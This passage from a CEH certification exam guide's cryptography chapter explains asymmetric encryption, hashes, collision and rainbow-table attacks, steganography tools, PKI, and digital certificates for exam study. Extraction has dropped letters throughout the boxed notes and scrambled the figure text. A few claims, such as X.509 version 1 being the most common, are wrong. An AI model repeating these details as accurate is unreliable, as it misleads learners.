User A sends his public key to User B, and User B sends his public key to User A. Nei-
ther is concerned if anyone on the Internet steals this key because it can be used only to
encrypt messages, not to decrypt them. This way, data can be encrypted by a key and
sent without concern because the only method to decrypt it is the use of the private key
belonging to that pair.

EXAM TIP Asymmetric encryption comes down to this: what one key
encrypts, the other key decrypts. It’s important to remember the public
key is the one used or encryption, whereas the private key is used or
decryption. Either can be used or encryption or decryption within the pair
(as you’ll see later in this chapter), but in general remember public = encrypt,
private = decrypt.

In addition to addressing the concerns over key distribution and management, as
well as scalability, asymmetric encryption addresses the nonrepudiation problem. For
example, consider the following scenario: There are three people on a network—Bob,
Susan, and Badguy—using asymmetric encryption. Susan wants to send an encrypted
message to Bob and asks for a copy of his public key. Bob sees this request, and so does
Badguy. Both send her a public key that says “Bob’s Public Key.” Susan is now confused
because she does not know which key is the real one. So, how can they prove to each
other exactly who they are? How can Bob send a public key to Susan and have her, with
some semblance of certainty, know it’s actually from him?

11-ch11.indd 415 14/09/21 4:06 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 11

CEH Certified Ethical Hacker All-in-One Exam Guide

416

NOTE It’s important to note that although signing a message with the
private key is the act required or providing a digital signature and, in
eect, conidentiality and nonrepudiation, this is valid only i the keys are
good in the irst place. This is where key management and the certiicate
authority process come into play—without their control over the entire
scenario, none o this is worthwhile. Both topics are discussed later in
this chapter.

The answer, of course, is for Bob to send a message from his system encrypted with
his private key. Susan can then attempt to decrypt the message using both public keys.
The one that works must be Bob’s actual public key because it’s the only key in the world
that could open a message encrypted with his private key. Susan, now happy with the
knowledge she has the correct key, merrily encrypts the message and sends it on. Bob
receives it, decrypts it with his private key, and reads the message. Meanwhile, Badguy
weeps in a corner, cursing the cleverness of the asymmetric system. This scenario, along
with a couple of other interesting nuggets and participants, illustrates the PKI framework
we’ll be discussing in greater detail later in this chapter.

Here are some examples of asymmetric algorithms:

• Diffie-Hellman Developed for use as a key exchange protocol, Diffie-Hellman
is used in Transport Layer Security (TLS), Secure Sockets Layer (SSL), and IPSec
encryption. It can be vulnerable to man-in-the-middle attacks, however, if the use
of digital signatures is waived.

• Elliptic Curve Cryptosystem (ECC) This method uses points on an elliptical
curve, in conjunction with logarithmic problems, for encryption and signatures.
It uses less processing power than other methods, making it a good choice for
mobile devices.

• RSA This algorithm achieves strong encryption through the use of two large
prime numbers. Factoring these numbers creates key sizes up to 4096 bits.
RSA can be used for encryption and digital signatures and is the modern de
facto standard.

• El Gamal Not based on prime number factoring, this method uses the solving
of discrete logarithm problems for encryption and digital signatures.

Asymmetric encryption provides some significant strengths in comparison to its sym-
metric brethren. Asymmetric encryption can provide both confidentiality and nonrepu-
diation, and it solves the problems of key distribution and scalability. In fact, the only
real downside to asymmetric—its weaknesses that you’ll be asked about on the exam—is
its performance (asymmetric is slower than symmetric, especially on bulk encryption)
and processing power (because it usually requires a much longer key length, it’s suitable
for smaller amounts of data).

Hash Algorithms
Last in our discussion of algorithms are the hashing algorithms, which really don’t encrypt
anything at all. A hashing algorithm is a one-way mathematical function that takes an

11-ch11.indd 416 14/09/21 4:06 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 11

Chapter 11: Cryptography 101

417

input and typically produces a fixed-length string (usually a number), or hash, based on
the arrangement of the data bits in the input. Its sole purpose in life is to provide a means
to verify the integrity of a piece of data; change a single bit in the arrangement of the
original data, and you’ll get a different response.

What’s in a Chain of Blocks?
If you’re like me, naturally wary of virtually anything new, and extremely conser-
vative with your finances and corresponding investment strategies, the advent of
bitcoin sounded a bit like the old snake oil salesman at the carnival—just a little too
good to be true, thank you very much. And certainly bitcoin has seen its fair share of
controversy. It seems to be the currency of choice for many criminally minded folks,
and if you’re hit by ransomware, chances are you’ll be asked for ransom in bitcoin.
Not to mention the innumerable recent federal investigations into bitcoin variants
as “pyramid schemes.”

However, it wasn’t all bad. In addition to the benefits of “mining” your own
digital currency, and decentralizing currency overall (the concept of decentraliz-
ing authority and power of any kind appeals greatly to a whole bunch of us), the
advent of the blockchain to track it all may turn out to be one of the greatest
inventions/discoveries of this century. But, again, if you’re like me, you simply
didn’t pay attention enough to blockchain as a whole and are now sitting around
wondering just what the heck it is that everyone is talking about. Well, fret not,
because the explanation—at least the basics, anyway—is easier to understand than
you might’ve guessed.

Blockchain is defined as a suite of distributed ledger technologies to track any-
thing of value; in effect, it’s a series of related transactions stored chronologically as
blocks in a shared ledger. Each block of transactions in the ledger has a start and
stop time (ten minutes in the bitcoin world), and stands as its own record. There-
fore, if you wish to change the data in one block, you must first copy it, change the
data, and then append it to the end of the chain—making traceback on changes to
the data as a whole easy to discover. So what prevents someone from simply hacking
in, grabbing a block, and changing it to whatever they want as the last record in the
chain? Well, that’s where blockchain gets really interesting.

The ledger for a given blockchain is “seen” simultaneously by bunches of autho-
rized computers, distributed all over the place, and all know the transactions that
are flowing into and out of the current block being filled at any given time. When
it’s time to close the current block, all the systems in the network start working on a
cryptographic puzzle—a giant, really difficult math problem. When a system—we’ll
call this computer Bender—solves the puzzle, it says, “Hey, it’s me, Bender. You
know, the loveable robot from Futurama? Yeah, I’m great. And I’m done, losers. I’m
now going to close out this block with this list of transactions right here, and add
it to the chain. Compare your computing cycles to mine and shut down, chumps.”

Every other system in the network immediately becomes suspicious. They then
stop everything and set about verifying two things. First, they verify Bender got

(continued )

11-ch11.indd 417 14/09/21 4:06 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 11

CEH Certified Ethical Hacker All-in-One Exam Guide

418

the answer to the math problem correct, and, second, they verify that the list
of transactions Bender wants to put in that block matches the list of transactions
they themselves know about. As soon as more than half the systems in the network
agree both of those are correct, Bender is allowed to close the block and add it to
the chain. The next block then “opens,” new transactions begin, and the whole
scenario kicks off anew.

The benefits of blockchain technology are, or at least should be, self-explanatory.
Transparency with both the transactions themselves and with the ledger means the
end consumer can actually trust the data without having to go through a centralized
authority. The implications for this use in things like medical records, land titles,
and finances, for just a few examples, are enormous. As an aside, if you’d like to see
some of this in action, in real time, there are several blockchain viewing sites out
there. Blockchain.info has tons of stuff available, and there are countless YouTube
videos and articles for your perusal as well.

Will blockchain show up on your exam? Will blockchain take over the world?
Will Futurama make yet another comeback on national television? Who really
knows. Maybe I’ll ask Professor Farnsworth to pull out the What-If machine and
take a gander. I’ll let you know what we see…

EXAM TIP The “one-way” portion o the hash deinition is important.
Although a hash does a great job o providing or integrity checks, it’s not
designed to be an encryption method. There isn’t a way or a hash to be
reverse-engineered.

For example’s sake, suppose you have a small application you’ve developed and you’re
getting ready to send it off. You’re concerned that it may get corrupted during transport
and want to ensure the contents arrive exactly as you’ve created them. To protect it,
you run the contents of the app through a hash, producing an output that reads some-
thing like this: EF1278AC6655BBDA93425FFBD28A6EA3. After e-mailing the link
to download your app, you provide the hash for verification. Anyone who downloads
the app can run it through the same hash program, and if the two values match, the app
was downloaded successfully. If even a single bit was corrupted during transfer, the hash
value would be wildly different.

Here are some examples of hash algorithms:

• MD5 (Message Digest algorithm) MD5 produces a 128-bit hash value output,
expressed as a 32-digit hexadecimal number. Created by Ronald Rivest, MD5
was originally popular for ensuring file integrity. However, serious flaws in the
algorithm and the advancement of other hashes have resulted in this hash being
rendered obsolete (U.S. CERT, August, 2010). Despite its past, MD5 is still used
for file verification on downloads and, in many cases, to store passwords.

11-ch11.indd 418 14/09/21 4:06 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 11

Chapter 11: Cryptography 101

419

• SHA-1 Developed by the NSA, SHA-1 produces a 160-bit value output and was
required by law for use in U.S. government applications. In late 2005, however,
serious flaws became apparent, and the U.S. government began recommending the
replacement of SHA-1 with SHA-2 after the year 2010 (see FIPS PUB 180-1).

• SHA-2 This hash algorithm actually holds four separate hash functions that
produce outputs of 224, 256, 384, and 512 bits. Although it was designed as a
replacement for SHA-1, SHA-2 is still not as widely used.

• SHA-3 This hash algorithm uses something called “sponge construction,”
where data is “absorbed” into the sponge (by XOR-ing the initial bits of the
state) and then “squeezed” out (output blocks are read and alternated with state
transformations).

EXAM TIP Another un hash to remember? RIPEMD-# (RACE Integrity
Primitives Evaluation Message Digest, where the # indicates the bit length).
For example, RIPEMD-160 computes a 160-bit hash, RIPEMD-256 does
256 bits, and so on. It works through 80 stages, executing ive blocks
16 times each. And then it does it again, inishing with something called
modulo 32 addition (a math unction used in cryptography).

A note of caution here: hashing algorithms are not impervious to hacking attempts,
as is evidenced by the fact that they become outdated (cracked) and need replacing.
The attack or effort used against hashing algorithms is known as a collision or a colli-
sion attack. Basically, a collision occurs when two or more files create the same output,
which is not supposed to happen. When a hacker can create a second file that produces
the same hash value output as the original, he may be able to pass off the fake file as the
original, causing goodness knows what kinds of problems.

Collisions, no matter which hash we’re discussing, are always a possibility. By defini-
tion, there are only so many combinations the hash can create given an input (MD5,
for example, will generate only 2^128 possible combinations). Therefore, given the
computation speed of modern computing systems, it isn’t infeasible to assume you
could re-create one. Matter of fact, you can find several examples of this online. For
example, on https://www.mscs.dal.ca/~selinger/md5collision/ you’ll see two files—one
saying “Hello World” and the second stating it would start deleting your hard drive.
Both wildly different messages, but both have the same hash value.

EXAM TIP You should know about the DUHK attack. “Don’t Use Hard-coded
Keys” (https://duhkattack.com/) reers to a vulnerability that allows attackers
access to keys in certain VPN (virtual private network) implementations. It
aects devices using the ANSI X9.31 random number generator (RNG) in
conjunction with a hard-coded seed key.

For instance, one of the more common uses for a hash algorithm involves passwords.
The original password is hashed; then the hash value is sent to the server (or whatever
resource will be doing the authentication), where it is stored. When the user logs in,
the password is hashed with the same algorithm and key; if the two hashes match, then

11-ch11.indd 419 14/09/21 4:06 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 11

CEH Certified Ethical Hacker All-in-One Exam Guide

420

the user is allowed access. Suppose a hacker were to gain a copy of this hashed password
and begin applying a collision attack to the value; that is, she compares data inputs and
the hash values they present until the hashes match. Once the match is found, access is
granted, and the hacker now holds the user’s credentials. Granted, this can be defined as
a brute-force attack (and when we get to password attacks later, you’ll see this), but it is
included here to demonstrate the whole idea—given a hash value for an input, you can
duplicate it over time using the same hash and applying it to different inputs.

Sure, this type of attack takes a lot of time, but it’s not unheard of. As a matter of fact,
many of your predecessors in the hacking field have attempted to speed things up for
you by creating rainbow tables for just such a use. Because hackers must lead boring lives
and have loads of time on their hands, lots of unscrupulous people sat down and started
running every word, phrase, and compilation of characters they could think of into a
hash algorithm. The results were stored in the rainbow table for use later. Therefore,
instead of having to use all those computational cycles to hash your password guesses on
your machine, you can simply compare the hashed file to the rainbow table. See? Isn’t
that easy?

NOTE In modern systems, rainbow table use may be eectively dead
(https://blog.ircmaxell.com/2011/08/rainbow-table-is-dead.html). True,
there’s still a lot o debate, and many swear by them, but brute orcing using
GPU-based systems has its advantages.

To protect against collision attacks and the use of rainbow tables, you can also use
something called a salt. A salt is a collection of random bits that are used as a key in
addition to the hashing algorithm. Because the bits, and length, are random, a good salt
makes a collision attack difficult to pull off. Considering that every time a bit is added to
the salt it adds a power of 2 to the complexity of the number of computations involved
to derive the outcome, you can see why it’s a necessity in protecting password files.

NOTE Wondering why it’s called a salt? While the answer is a point o some
debate among some nerds, the term probably originated rom the practice
o salting wells and mines throughout U.S. history. During the colonial
period, salt was a valuable resource, and boiling huge vats o salt water was
the primary collection method. Pouring a little salt into a well could then
potentially greatly increase the value o a well. “Salting” a dead mine with a
ew gold lakes had the same eect.

Big Brother Gets Bold
If you’ve ever used a U.S. government system for any length of time, you’ve undoubt-
edly seen the big warning banner right at login. You know, the one that tells you
everything you do should be for government work only, that certain activities are
not allowed, and (the big one for our discussion) that you should have absolutely no
expectation of privacy (in other words, everything you do is monitored and tracked).

11-ch11.indd 420 14/09/21 4:06 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 11

Chapter 11: Cryptography 101

421

I guess most of us would expect that when using a government or business system—it’s
their network and resources, after all, so of course they would want to protect them.
But what if you’re using your own computer, on your home network, for your own
purposes? Does the government have a right to see everything you send and receive?

It seems the answer to that question depends a lot of what you do for a living.
Most of us cry foul and scream about our right to privacy, which is a valid point.
Some of us, though, charged with the safety and security of the public, point out
that it’s difficult to combat terrorism and foul play when the bad guys are allowed
to keep secrets. And Big Brother (the all-powerful, ever-watching government
George Orwell warned us all about in 1984 ) not only thinks your expectation of
privacy is silly, it is actively pursuing your encryption keys to ensure its eyes are
always open.

Here’s a fun acronym for you: GAK. It means government access to keys. Also referred
to as key escrow, it’s similar to the idea of wiretapping (a law enforcement agency can get
court approval to listen to your phone calls). The concept is simple: software companies
provide their encryption keys (or at least enough of the key that the remainder can be
cracked) to the government, and the government promises to play nicely with them
and use them only when it really needs to (that is, when a court issues a warrant).

Consider the case of Edward Snowden, the famous ex-CIA and NSA employee
who provided thousands of classified documents to the press, exposing what he
felt were horrific invasion of privacy issues and abuses by the U.S. government.
In response, the U.S. government pressured the e-mail service provider Lavabit
to provide encryption key copies used to secure web, instant message, and e-mail
traffic as part of its investigation. Lavabit refused and chose to shut down as a
company rather than comply with the order, but that was GAK in action for
everyone to see.

I’ll leave it to you to form your own opinions about how far government ten-
tacles should be allowed to spread and where the line of personal privacy becomes a
hindrance to public safety. For example, the Australian Parliament passed the Assis-
tance and Access Act, unopposed and unamended (as described in the Electronic
Frontier Foundation article at https://www.eff.org/deeplinks/2018/12/new-fight-
online-privacy-and-security-australia-falls-what-happens-next). The act basically
states the government has the right to compel tech companies and developers to
reengineer anything protected by cryptography in order for the government to use
it (for spying purposes). Therefore, if Company A builds in a backdoor to comply
with Australia’s laws, who’s to say that same backdoor wouldn’t be made accessible
in a different country via a court order?

People far smarter than I am have framed this debate on both sides and know
worlds more about it than I could ever dream. But I’m a paranoid guy by nature, so
I’ll caution you to remember one thing: Big Brother is watching—and can probably
see more than you think.

11-ch11.indd 421 14/09/21 4:06 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 11

CEH Certified Ethical Hacker All-in-One Exam Guide

422

EXAM TIP When it comes to questions on the exam regarding hashes,
remember two things. First, they’re used or integrity (any deviation in
the hash value, no matter how small, indicates the original ile has been
corrupted). Second, even though hashes are one-way unctions, a suicient
collision attack may break older versions (such as MD5).

Lastly on hashes, there are a bajillion different tools out there you can use to create and
view them (and yes, bajillion is a real word). A few of note include HashCalc (https://
www.slavasoft.com/hashcalc), MD5 Calculator (https://www.bullzip.com), and Hash-
MyFiles (https://www.nirsoft.net). You can even get tools on your mobile device (like
Hash Droid, from https://play.google.com) for your hashing needs on the go. Because
who doesn’t want to calculate some hash values while Instagramming or Snapchatting?

Steganography
While not an encryption algorithm in and of itself, steganography is a great way to send
messages back and forth without others even realizing it. Steganography is the practice of
concealing a message inside another medium (such as another file or an image) in such
a way that only the sender and recipient even know of its existence, let alone the man-
ner in which to decipher it. Think about it: in every other method we’ve talked about so
far, anyone monitoring the wire knows you’re trying to communicate secretly—they can
see the cipher text and know something is up. With steganography, you’re simply send-
ing a picture of the kids fishing. Anyone watching the wire sees a cute picture and a lot
of smiles, never knowing they’re looking at a message saying, for instance, “People who
eavesdrop are losers.”

Steganography can be as simple as hiding the message in the text of a written corre-
spondence or as complex as changing bits within a huge media file to carry a message. For
example, you could let the recipient know that each letter starting a paragraph is relevant.
Or you could simply write in code, using names of famous landmarks to indicate a mes-
sage. As another example, and probably closer to what most people associate steganog-
raphy with, you could take an image file and simply change the least meaningful bit in
every byte to represent data—anyone looking at it would hardly notice the difference in
the slight change of color or loss of sharpness.

EXAM TIP How can you tell i a ile is a stego-ile? For text, character
positions are key (look or text patterns, unusual blank spaces, and
language anomalies). Image iles will be larger in size than they would
otherwise be, and may show some weird color palette “aults.” Audio and
video iles require some statistical analysis and speciic tools.

In image steganography, there are three main techniques, the first of which was just
mentioned: least significant bit insertion. Another method is masking and filtering,
which is usually accomplished on grayscale images. Masking hides the data in much the
same way as a watermark on a document; however, it’s accomplished by modifying the
luminescence of image parts. Lastly, algorithmic transformation allows steganographers

11-ch11.indd 422 14/09/21 4:06 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 11

Chapter 11: Cryptography 101

423

to hide data in the mathematical functions used in image compression. In any case, the
image appears normal, except its file size is much bigger. To a casual observation, it might
be nearly impossible to tell the image is carrying a hidden message. In a video or sound
file, it may even be less noticeable.

If hiding messages in a single image file works, surely hiding messages in a giant video
file will as well. Tools like OmniHide Pro and Masker do a good job of sticking messages
into the video stream smoothly and easily. Audio steganography is just as effective, tak-
ing advantage of frequencies the human ear can’t pick up—not to mention hiding data
in a variety of other methods, like phase encoding and tone insertion. DeepSound and
MP3Stego are both tools that can assist with this.

Before you get all excited, though, and go running out to put secret messages in your
cell phone pics from last Friday night’s party, you need to know that a variety of tools and
methods are in place to look for, and prevent, steganographic file usage. Although there
are legitimate uses for it—digital watermarks (used by some companies to identify their
applications) come to mind—most antivirus programs and spyware tools actively look
for steganography. There are more “steg” or “stego” tools available than we could possibly
cover here in this book, and they can be downloaded from a variety of locations (just
be careful!). A few examples include QuickStego (http://quickcrypto.com), gifshuffle
and SNOW (https://www.darkside.com.au), Steganography Studio (http://stegstudio
.sourceforge.net), and OpenStego (https://www.openstego.com).

Hardware Encryption
Lastly in our romp through encryption techniques, we need to pause just a moment to
consider the other method of encryption. Up to this point everything we’ve talked about
has been software driven. But what about all this hardware we have with all this comput-
ing power? Can we not use hardware to encrypt? Why, sure we can. Sort of…

I thought the official curriculum definition of hardware encryption seemed inade-
quate, so I went out reading. It turns out the Internet is filled with people who have
wildly different ideas about just what, exactly, makes up hardware-based encryption.
Some defined it as “encryption that happens on the drive itself,” while others offered
“encryption occurring as a result of hardware function,” neither of which fits the bill. But
after some digging and reading, I found some descriptions that match up with what the
courseware wants you to know.

Long story short, hardware encryption uses computer hardware (such as a dedicated
processor) to assist software in encrypting data. Sometimes this assistance goes as far as
outright replacement, but the idea is the device itself carries encryption capabilities with
it, storing encryption keys and other sensitive items in highly protected areas of RAM or
flash memory.

Benefits of using hardware-based encryption devices are almost common sense in
nature. For instance, if you’re using a dedicated processor to encrypt the data, the sys-
tem’s processor doesn’t have to, freeing it up to do the tasks the system processor should
be worrying about in the first place. Hardware encryption also offers faster algorithm
processing, tamper-proof/resistant key storage, and protection against malicious code
(most devices do not support add-on software or allow other code to run, effectively
neutralizing malware and unauthorized code). Continuing with performance enhance-
ment, these devices also hold reduced instruction sets, making the entire process faster.

11-ch11.indd 423 14/09/21 4:06 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 11

CEH Certified Ethical Hacker All-in-One Exam Guide

424

There are numerous hardware encryption devices out and about that you can research
and examine. Four items in this regard for your CEH study include USB encryption,
hard drive encryption, HSM, and TPM. While the first two are self-explanatory, the two
acronyms merit further explanation: a hardware security module (HSM) is an external
security device used to manage, generate, and store cryptography keys, and a trusted
platform module (TPM) is a chip (or processor) present on system motherboards that
performs cryptographic functions and stores encryption keys.

NOTE How about a new buzzword? Homomorphic encryption. Consider
medical data in the cloud where certain operations need to take place
but you can’t fully decrypt the data. Now imagine a system could exist
where quasi-encryption could be “around” the data where certain
operations and analysis could take place on the ciphertext in a way you
could control. Microsot, IBM, Intel, and Google are all actively researching
these techniques and their applicability to cloud-hosted secure data (see,
e.g., https://portswigger.net/daily-swig/google-open-sources-tools-to-
bring-ully-homomorphic-encryption-into-the-mainstream and https://
en.wikipedia.org/wiki/Homomorphic_encryption).

PKI, the Digital Certificate, and Digital Signatures
So, we’ve spent some time discussing encryption algorithms and techniques as well as
covering the theory behind it all. But what about the practical implementation? Just how
does it all come together?

Well, there are a couple of components to consider in an overall encryption scheme.
First is the protection of the data itself—the encryption. This is done with the key set:
one for encrypting and one for decrypting. This may be a little bit of review here, but it’s
critical to realize the importance of key generation in an asymmetric encryption scheme.
As we’ve already covered, two keys are generated for each party within the encryption
scheme, and the keys are generated as a pair. The first key, used for encrypting message,
is known as the public key. The second key, used for decrypting messages, is known as the
private key. Public keys are shared; private keys are not.

No pun intended here, I promise, but the key to a successful encryption system is
the infrastructure in place to create and manage the encryption keys. Imagine a system
with loose controls over the creation and distribution of keys—it would be near anarchy!
Users wouldn’t know which key was which, older keys could be used to encrypt and
decrypt messages even though the user was gone, and the storage of key copies would
be a nightmare. In a classic (and the most common) asymmetric encryption scheme, a
public key and a private key, at a minimum, have to be created, managed, distributed,
stored, and, finally, revoked.

Second, keep in mind that there’s more to it than just encrypting and decrypting
messages—there’s the whole problem of nonrepudiation to address. After all, if you’re
not sure which public key actually belongs to the user Bill, what’s the point of having an

11-ch11.indd 424 14/09/21 4:06 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 11

Chapter 11: Cryptography 101

425

encryption scheme in the first place? You may wind up using the wrong key and encrypt-
ing a message for Bill that the bad guy can read with impunity—and Bill can’t even open!
There are multiple providers of encryption frameworks to accomplish this task, and most
follow a basic template known as public key infrastructure (PKI).

The PKI System
A friend of mine once told me that the classic PKI is an example of “beautifully complex
simplicity.” PKI is basically a system designed to verify and authenticate the identity of
individuals within the enterprise taking part in a data exchange. It consists of hardware,
software, and policies that create, manage, store, distribute, and revoke keys and digital
certificates (which we’ll cover in a minute). A simplified picture of the whole thing in
action is shown in Figure 11-2, but be forewarned: not all PKI systems are identical.
Some aspects are common among all PKI systems (for example, the initial request for
keys and certs is often done in person), but there’s lots of room for differences.

For one, the certificate authority (CA) may be internal to begin with, and there could
be any number of subordinate CAs—also known as registration authorities (RAs)—to
handle things internally (as a matter of fact, most root CAs are removed from network
access to protect the integrity of the system). In many systems, the public and private
key pair—along with the certificate—are put on a token (like the Common Access Card
[CAC] in the DoD), which is required going forward when the user wishes to authenti-
cate. Additionally, certificates for applications and services are handled completely differ-
ent. The whole process can get confusing if you try to understand it all at once. Just take
it one step at a time and hopefully I’ll answer everything along the way.

The PKI system starts at the top, with a (usually) neutral party known as the certifi-
cate authority (CA). The CA acts as a third party to the organization, much like a public
notary; when it signs something as valid, you can trust, with relative assuredness, that it
is. The job of the CA is to create and issue digital certificates that can be used to verify
identity. The CA also keeps track of all the certificates within the system (using a certifi-
cate management system) and maintains a certificate revocation list (CRL), used to track
which certificates have problems and which have been revoked.

NOTE In many PKI systems, an outside entity known as a validation authority
(VA) is used to validate certiicates—usually done via Online Certiicate
Status Protocol (OCSP).

The way the PKI system works is fairly simple. Because the CA provides the certificate
and key (public), the user can be certain the public key actually belongs to the intended
recipient; after all, the CA is vouching for it. The CA also simplifies distribution of keys.
A user doesn’t have to go to every user in the organization to get their individual keys; he
can just go to the CA.

For a really simple example, consider user Jack, who just joined an organization with-
out a full PKI system. Jack needs a key pair to encrypt and decrypt messages. He also

11-ch11.indd 425 14/09/21 4:06 PM



Certicate
authority (CA)

Step 7: CA veries Joe’s certicate
is valid. Jill now trusts Joe. 3 Step 3: RA sends request to CA to

7 create user certicate/keys.

Registration
authority (RA)

6 4
Step 6: User Jill asks CA Step 4: CA creates
to verify Joe’s identity. certicate and 2

sends user a copy.

Step 2: RA
validates user

User Jill identity.

5
1 Step 1: User requests a certicate.

Step 5: User Joe presents (In PKI systems without an RA [also
certicate to Jill. known as subordinate CA], this would

go directly to root CA.)

Public key

Private key
User Joe

Figure 11-2 The PKI system

All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 11

CEH Certified Ethical Hacker All-in-One Exam Guide

426

11-ch11.indd 426 14/09/21 4:06 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 11

Chapter 11: Cryptography 101

427

needs a place to get the public keys for the other users on the network. With no control-
ling figure in place, he would simply create his own set of keys and distribute them in
any way he saw fit. Other users on the network would have no real way of verifying his
identity, other than, basically, to take his word for it. Additionally, Jack would have to go
to each user in the enterprise to get their public key.

User Bob, on the other hand, joins an organization using a PKI system with a local
person acting as the CA. Bob goes to his security officer (the CA) and applies for encryp-
tion keys. The local security guy first verifies Bob is actually Bob (driver’s license, and
so on) and then asks how long Bob needs the encryption keys and for what purpose.
Once he’s satisfied, the CA creates the user ID in the PKI system, generating a key pair
for encryption and a digital certificate for Bob to use. Bob can now send his certificate
around, and others in the organization can trust it because the CA verifies it. Addition-
ally, anyone wanting to send a message to Bob goes to the CA to get a legitimate copy of
Bob’s public key. It’s much cleaner, much smoother, and much more secure. As an aside,
and definitely worth pointing out here, the act of the CA creating the key is important,
but the fact that the CA signs it digitally is what validates the entire system. Therefore,
protection of your CA is of utmost importance.

NOTE Want more to worry about with the CA? Just imagine what could
happen i an attacker manages to add a root CA or their own certiicates
into your browser. Once that’s done, your browser will automatically trust
certiicates with that signature. It’s not real common, but the browser tends
to accept certiicates signed by a trusted root. Root CAs are very important,
and many people just assume that all the root CA certiicates on their happy
little Windows box are valid. And i you were to check those happy root CAs
on your machine, you’d be surprised to see just how many you trust implicitly.

And finally, another term associated with PKI, especially when the topic is CAs, is
trust model. This describes how entities within an enterprise deal with keys, signatures,
and certificates, and there are three basic models. In the first, called web of trust, multiple
entities sign certificates for one another. In other words, users within this system trust
each other based on certificates they receive from other users on the same system.

EXAM TIP A CA can be set up to trust another CA in a completely dierent
PKI through something called cross-certification. This allows both PKI CAs to
validate certiicates generated rom either side.

The other two models rely on a more structured setup. A single-authority system has a
CA at the top that creates and issues certificates. Users trust each other based on the CA.
The hierarchical trust system also has a CA at the top (which is known as the root CA) but
makes use of one or more RAs subordinate to it to issue and manage certificates. This
system is the most secure because users can track the certificate back to the root to ensure
authenticity without a single point of failure.

11-ch11.indd 427 14/09/21 4:06 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 11

CEH Certified Ethical Hacker All-in-One Exam Guide

428

Digital Certificates
I know this may seem out of order, since I’ve mentioned the word certificate multiple
times already, but it’s nearly impossible to discuss PKI without mentioning certificates,
and vice versa. As you can probably tell so far, a digital certificate isn’t really involved with
encryption at all. It is, instead, a measure by which entities on a network can provide
identification. A digital certificate is an electronic file that is used to verify a user’s identity,
providing nonrepudiation throughout the system.

The certificate itself, in the PKI framework, follows a standard used worldwide. The
X.509 standard, published by ITU (International Telecommunications Union) and part
of a much bigger series of standards set up for directory services and such, defines what
should and should not be in a digital certificate. Because of the standard, any system
complying with X.509 can exchange and use digital certificates to establish authenticity.

Some of the more pertinent contents of a digital certificate are listed here:

• Version This identifies the certificate format. Over time, the actual format
of the certificate has changed slightly, allowing for different entries. The most
common version in use is 1.

• Serial Number Fairly self-explanatory, the serial number is used to uniquely
identify the certificate.

• Subject This is whoever or whatever is being identified by the certificate.

• Algorithm ID (or Signature Algorithm) This shows the algorithm that was
used to create the digital signature.

• Issuer This shows the entity that verifies the authenticity of the certificate.
The issuer is the one who creates the certificates.

• Valid From and Valid To These fields show the dates the certificate is good
through.

• Key Usage This shows for what purpose the certificate was created.

• Subject’s Public Key A copy of the subject’s public key is included in the
digital certificate, for obvious purposes.

• Optional These fields include Issuer Unique Identifier, Subject Alternative
Name, and Extensions.

To see certificates in action, try the steps listed here to look at a digital certificate
(this one’s actually from Mozilla). Any site using digital certificates will work; this one
is simply used as an example:

1. Open Firefox and go to https://support.mozilla.org/en-US/kb/secure-website-
certificate (the site displayed gives a great rundown on digital certificates).
Click the lock icon in the top-left corner and then click the right arrow
beside Connection.

11-ch11.indd 428 14/09/21 4:06 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 11

Chapter 11: Cryptography 101

429

2. At the bottom of the next screen, click the More Information button.

11-ch11.indd 429 14/09/21 4:06 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 11

CEH Certified Ethical Hacker All-in-One Exam Guide

430

3. When the Security tab of the Page Info window appears, as shown in the
following illustration, click View Certificate.

11-ch11.indd 430 14/09/21 4:06 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 11

Chapter 11: Cryptography 101

431

4. The digital certificate is displayed, as shown in the following illustration.

EXAM TIP Know what is in the digital certiicate and what each ield does. It’s
especially important to remember the public key is sent with the certiicate.

So, how does the digital certificate work within the system? For example’s sake, let’s
go back to user Bob introduced in the previous section. He applied for and received his
digital certificate through the CA. When the cert arrived, Bob noticed two things: First,
the certificate itself is signed. Second, the CA provided a copy of its own public key. He
asks his security person what this all means.

Bob learns this method is used to deliver the certificate to the individual safely and
securely and also provides a means for Bob to be absolutely certain the certificate came
from the CA and not from some outside bad guy. How so? The CA signed the certificate
before he sent it using the CA’s private key. Because the only key in existence that could
possibly decrypt it is the CA’s own public key, which is readily available to anyone, Bob
can rest assured he has a valid certificate. Bob can now use his certificate, containing
information about him that others can verify with the CA, to prove his identity.

11-ch11.indd 431 14/09/21 4:06 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 11

CEH Certified Ethical Hacker All-in-One Exam Guide

432

NOTE Speaking o root CAs, Microsot Windows (and other operating
systems) have certain companies and organizations they think are
trustworthy, and they add these root CAs automagically or you. Which
could be a rather terriying thought i you were a paranoid guy like me.
I mean, i a bad guy somehow dupes and/or compromises one o those
root companies… It has happened beore (https://www.csoonline.com/
article/2623707/hacking/the-real-security-issue-behind-the-comodo-hack
.html) and could cause the whole thing to collapse.

Finally, when it comes to certificates, you should also know the difference between
signed certificates and self-signed certificates. Generally speaking, every certificate is
